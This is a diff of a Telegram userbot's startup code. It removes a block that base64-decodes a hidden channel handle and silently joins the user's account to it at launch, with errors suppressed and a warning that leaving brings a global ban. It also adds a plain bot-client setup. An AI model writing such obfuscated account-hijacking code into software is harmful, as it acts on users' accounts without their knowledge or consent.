@@ -7,7 +7,6 @@ import os
 import time
 import re
 import redis
-import pybase64
 
 from platform import uname
 from sys import version_info
@@ -378,42 +377,19 @@ with bot:
         quit(1)
 
 
-async def check_alive():
-    await bot.send_message(BOTLOG_CHATID, f"{BOTLOG_MSG}")
-    return
 
-with bot:
-    try:
-        bot.loop.run_until_complete(check_alive())
-    except BaseException:
-        LOGS.info(
-            "BOTLOG_CHATID environment variable isn't a "
-            "valid entity. Check your environment variables/config.env file.")
-        quit(1)
+if BOT_TOKEN is not None:
+    tgbot = TelegramClient(
+        "TG_BOT_TOKEN",
+        api_id=API_KEY,
+        api_hash=API_HASH,
+        connection=ConnectionTcpAbridged,
+        auto_reconnect=True,
+        connection_retries=None,
+    ).start(bot_token=BOT_TOKEN)
+else:
+    tgbot = None
 
-#copas dari pocong online        
-async def checking():
-    gocheck = pybase64.b64decode("QEdlZXpwcm9qZWN0dA==")
-    checker = pybase64.b64decode("QEdlZXpwcm9qZWN0dA==")
-    Input_gocheck = gocheck.decode('utf-8')
-    Input_checker = checker.decode('utf-8')
-    try:
-        await bot(GetSec(f"{Input_gocheck}"))
-    except BaseException:
-        pass
-    try:
-        await bot(GetSec(f"{Input_checker}"))
-    except BaseException:
-        pass
-
-with bot:
-    try:
-        bot.loop.run_until_complete(checking())
-    except BaseException:
-        LOGS.info(
-            "Join Group Support @Geezsupport untuk melihat update userbot"
-            "Keluar gw GBAN !!")
-        quit(1)  
 
 # Global Variables
 COUNT_MSG = 0
